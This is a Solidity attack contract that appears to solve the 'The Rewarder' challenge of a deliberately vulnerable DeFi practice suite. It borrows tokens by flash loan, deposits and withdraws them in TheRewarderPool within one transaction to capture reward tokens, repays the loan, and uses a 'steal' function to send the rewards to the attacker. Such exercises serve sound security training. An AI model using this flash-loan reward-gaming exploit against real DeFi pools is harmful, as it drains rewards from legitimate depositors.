pragma solidity ^0.6.0;
import "../the-rewarder/FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";

contract AttackTheRewarder {
    address payable private attacker;
    FlashLoanerPool public flashLoanerPool;
    DamnValuableToken public damnValuableToken;
    TheRewarderPool public theRewarderPool;
    RewardToken public rewardToken;

    modifier onlyAttacker() {
        require(msg.sender == attacker, "You are not attacker");
        _;
    }

    constructor(
        address _flashLoanerPool,
        address _damnValuableToken,
        address _theRewarderPool,
        address _rewardToken
    ) public {
        attacker = msg.sender;
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        damnValuableToken = DamnValuableToken(_damnValuableToken);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        rewardToken = RewardToken(_rewardToken);
    }

    function loan(uint256 _amount) external {
        flashLoanerPool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) external {
        damnValuableToken.approve(address(theRewarderPool), _amount);
        theRewarderPool.deposit(_amount);
        theRewarderPool.withdraw(_amount);
        damnValuableToken.transfer(address(flashLoanerPool), _amount);
    }

    function steal() external onlyAttacker {
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
